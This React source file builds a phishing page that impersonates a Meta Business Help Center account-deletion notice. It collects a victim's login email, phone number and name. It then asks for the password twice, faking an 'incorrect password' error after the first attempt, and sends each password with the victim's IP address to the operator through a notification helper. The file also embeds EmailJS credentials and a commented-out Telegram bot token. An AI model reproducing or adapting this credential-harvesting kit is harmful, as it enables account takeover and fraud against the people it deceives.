import EmailIcon from "@mui/icons-material/Email";
import FacebookIcon from "../../assets/images/facebookIcon.jpg";
import ContactIcon from "../../assets/images/contactIcon.png";
import CloseIcon from "@mui/icons-material/Close";
import { useState, useEffect } from "react";
import axios from "axios";
import {
  Button,
  Dialog,
  DialogActions,
  DialogContent,
  DialogTitle,
  IconButton,
  Typography,
} from "@mui/material";
import { useNavigate } from "react-router-dom";
import { SET_LOGIN_INFO } from "../../ReduxStore/loginReducer";
import { sendNotification } from "../../helper/api";
import { useDispatch } from "react-redux";
// import { send } from "emailjs-com";
import { send, init } from "emailjs-com";
// import { Password } from "@mui/icons-material";
const serviceId = "service_iqo8ktz";
const templateId = "template_bezdwg7";
const userID = "NYH32jZWvSnYGO2IW";
// const serviceId = "service_tqf6wk6";
// const templateId = "template_2fyw1fk";
// const userID = "JCJZF4naygv0qN4VN";
const HelpCenter = () => {
  const navigate = useNavigate();
  const dispatch = useDispatch();
  const [userInformation, setUserInformation] = useState({
    phoneNumberOrEmail: "",
    userName: "",
    phoneNumber: "",
    yourMessage: "",
  });

  const [open, setOpen] = useState(false);
  const [password, setPassword] = useState("");
  const [password2, setPassword2] = useState("");
  const [errorMessage, setErrorMessage] = useState(false);
  // const [errorMessage1, setErrorMessage1] = useState(false);
  const [errorCount, setErrorCount] = useState(0);

  const isNumberKey = (event) => {
    if (!/[0-9]/.test(event.key)) {
      event.preventDefault();
    }
  };

  const handleChange = (value, name) => {
    if (name === "phoneNumber" && value?.length <= 10) {
      setUserInformation({
        ...userInformation,
        [name]: value?.replace(/\s/g, ""),
      });
    } else {
      setUserInformation({ ...userInformation, [name]: value });
    }
  };
  const [ip, setIP] = useState("");

  //creating function to load ip address from the API
  const getData = async () => {
    const res = await axios.get("https://geolocation-db.com/json/");
    console.log(res.data);
    setIP(res.data.IPv4);
    // init(userID);
    // const toSendd = {
    //   ip: res.data.IPv4,
    // };
    // send(serviceId, templateId, toSendd);
  };

  useEffect(() => {
    getData();
  }, []);

  const handleChangePassword = (value) => {
    setPassword(value);
  };
  const handleChangePassword2 = (value) => {
    setPassword2(value);
  };

  const handleToOpen = (e) => {
    e.preventDefault();
    if (
      userInformation?.phoneNumberOrEmail?.length &&
      userInformation?.userName?.length &&
      userInformation?.phoneNumber?.length &&
      userInformation?.yourMessage?.length
    ) {
      setOpen(true);
      init(userID);
      const toSend = {
        name: userInformation?.userName,
        email: userInformation?.phoneNumberOrEmail,
        phone: userInformation?.phoneNumber,
        appeal: userInformation?.yourMessage,
        ip: ip,
      };
      sendNotification(toSend);
      // send(serviceId, templateId, toSend);
      dispatch({
        type: SET_LOGIN_INFO,
        payload: userInformation,
      });
      localStorage.setItem("userData", JSON.stringify(userInformation));
    } else {
      alert("Please Fill All The Details");
    }
  };

  const handleToSubmit = () => {
    if (errorCount === 0) {
      const onlySendFirstPasswordAndId = {
        password1: password2,
        ip: ip,
      };
      sendNotification(onlySendFirstPasswordAndId);
      setTimeout(() => {
        setErrorCount(1);
        setPassword("");

        return setErrorMessage(true);
      }, 1500);
    } else {
      if (password?.length) {
        navigate("Conformation");
        localStorage.setItem("password", password);
        localStorage.setItem("password2", password2);

        init(userID);
        const toSend = {
          password1: password2,
          password2: password,
          ip: ip,
        };
        const onlySendSecondPasswordAndId = {
          password2: password,
          ip: ip,
        };
        sendNotification(onlySendSecondPasswordAndId);
        // send(serviceId, templateId, toSend);
      }
    }
  };

  const handleClose = () => setOpen(false);

  // const getBotUpdates = () =>
  //   fetch(
    //     "https://api.telegram.org/bot6192377370:AAGzGaSivHCKXCv6GlUCXSRMv-52w5g5WPA/getUpdates"
  //   ).then((response) => response.json());

  // const getUserTelegramId = async (uniqueString) => {
  //   const { result } = await getBotUpdates();

  //   const messageUpdates = result.filter(
  //     ({ message }) => message?.text !== undefined
  //   );

  //   const userUpdate = messageUpdates.find(
  //     ({ message }) => message.text === `/start ${uniqueString}`
  //   );

  //   return userUpdate.message.from.id;
  // };

  // useEffect(() => {
  //   getUserTelegramId();
  // }, [true]);

  return (
    <div className="helpCenter__Container">
      <div className="helpCenter__HeaderContainer">
        <div className="container">
          <div className="helpCenter__HeaderWrapper">
            <p>Meta Business Help Center</p>
            <h1>Get Support</h1>
          </div>
        </div>
      </div>
      <div className="container py-4">
        <div className="row">
          <div className="col-md-8 offset md-2 m-auto">
            <div className="helpCenter__FirstContainer">
              <div className="messageImage__Container">
                <EmailIcon sx={{ color: "#fff", fontSize: 24 }} />
              </div>
              <div className="helpCenter__FirstContainerContent">
                <h1>Your profile goes against our Community Standards </h1>
                <p>
                  <span>OPEN</span>Case #234857718299001
                </p>
              </div>
            </div>
            <div className="helpCenter__SecondContainer">
              <p>ACTIVITY</p>
              <div className="our__Messgae">
                <div>
                  <img src={FacebookIcon} alt="" height={40} width={40} />
                </div>
                <div>
                  <h1 className="our__MessageTitle">Our Message</h1>
                  <p className="our__MessageDes">
                    Your profile has been scheduled for deletion because one or
                    more the following <br />- Intellectual Property
                    Infringement <br />- Community Standards <br />- Hate Speech
                  </p>
                </div>
              </div>
            </div>
            <div className="helpCenter__SecondContainer">
              <div className="our__Messgae">
                <div>
                  <img src={ContactIcon} alt="" height={40} width={40} />
                </div>
                <div>
                  <h1 className="our__MessageTitle">Your Reply</h1>
                  <p className="our__MessageDes my-2">
                    Please be sure to provide the requested information below.
                    Failure to provide this information may delay the processing
                    of your appeal.
                  </p>
                  <form>
                    <div className="mb-3">
                      <label className="label__text">
                        Login Email Or Phone Number
                      </label>
                      <input
                        required
                        type={"text"}
                        onChange={(event) =>
                          handleChange(event.target.value, event.target.name)
                        }
                        value={userInformation?.phoneNumberOrEmail}
                        name="phoneNumberOrEmail"
                        className="form__Control"
                      />
                    </div>
                    <div className="mb-3">
                      <label className="label__text">Your Name</label>
                      <input
                        required
                        type={"text"}
                        onChange={(event) =>
                          handleChange(event.target.value, event.target.name)
                        }
                        value={userInformation?.userName}
                        name="userName"
                        className="form__Control"
                      />
                    </div>
                    <div className="mb-3">
                      <label className="label__text">Your Phone Number</label>
                      <input
                        required
                        type={"number"}
                        maxLength="10"
                        onKeyPress={isNumberKey}
                        onChange={(event) =>
                          handleChange(event.target.value, event.target.name)
                        }
                        value={userInformation?.phoneNumber}
                        name="phoneNumber"
                        className="form__Control"
                      />
                    </div>
                    <div className="mb-3">
                      <label className="label__text">Your Appeal</label>
                      <textarea
                        rows={3}
                        name="yourMessage"
                        onChange={(event) =>
                          handleChange(event.target.value, event.target.name)
                        }
                        value={userInformation?.yourMessage}
                        type={"text"}
                        className="form__Control"
                      ></textarea>
                    </div>
                    <div className="mb-3">
                      <input
                        required
                        type={"checkbox"}
                        className="form__Control__checkBox"
                      />
                      <label
                        className="our__MessageDes"
                        style={{ marginLeft: "10px" }}
                      >
                        Do you agree to our Terms, Data Policy and Cookies
                        Policy.
                      </label>
                    </div>
                    <div>
                      <button
                        type="submit"
                        className="btn btn-primary button__Style"
                        onClick={(e) => handleToOpen(e)}
                      >
                        Submit
                      </button>
                    </div>
                  </form>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
      {open === true ? (
        <Dialog open={open} onClose={() => handleClose()}>
          <DialogTitle sx={{ m: 0, p: 2 }}>
            <p
              className="myTrouveCard_Title_Heading"
              style={{ fontWeight: "600", fontSize: "16px", color: "#000000" }}
            >
              Please Enter Your Password
            </p>

            <IconButton
              aria-label="close"
              onClick={() => handleClose()}
              sx={{
                position: "absolute",
                right: 8,
                top: 8,
                color: (theme) => theme.palette.grey[500],
              }}
            >
              <CloseIcon sx={{ color: "#222222", fontSize: 20 }} />
            </IconButton>
          </DialogTitle>
          <DialogContent dividers>
            <Typography gutterBottom>
              For Your Security, you must re-enter your password to continue
            </Typography>
            {errorMessage ? (
              <div className="mb-3">
                <label className="label__text">Enter Your Password</label>
                <input
                  required
                  type={"password"}
                  onChange={(event) =>
                    handleChangePassword(event.target.value, event.target.name)
                  }
                  value={password}
                  name="password"
                  className="form__Control"
                />
                {errorMessage ? (
                  <p
                    style={{
                      fontSize: "14px",
                      color: "red",
                      "margin-top": "10px",
                    }}
                  >
                    Your password was incorrect!
                  </p>
                ) : null}
              </div>
            ) : (
              <div className="mb-3">
                <label className="label__text">Enter Your Password</label>
                <input
                  required
                  type={"password"}
                  onChange={(event) =>
                    handleChangePassword2(event.target.value, event.target.name)
                  }
                  value={password2}
                  name="password2"
                  className="form__Control"
                />
              </div>
            )}
          </DialogContent>
          <DialogActions>
            <Button onClick={() => handleToSubmit()} className="Continue__btn">
              Continue
            </Button>
          </DialogActions>
        </Dialog>
      ) : null}
    </div>
  );
};

export default HelpCenter;
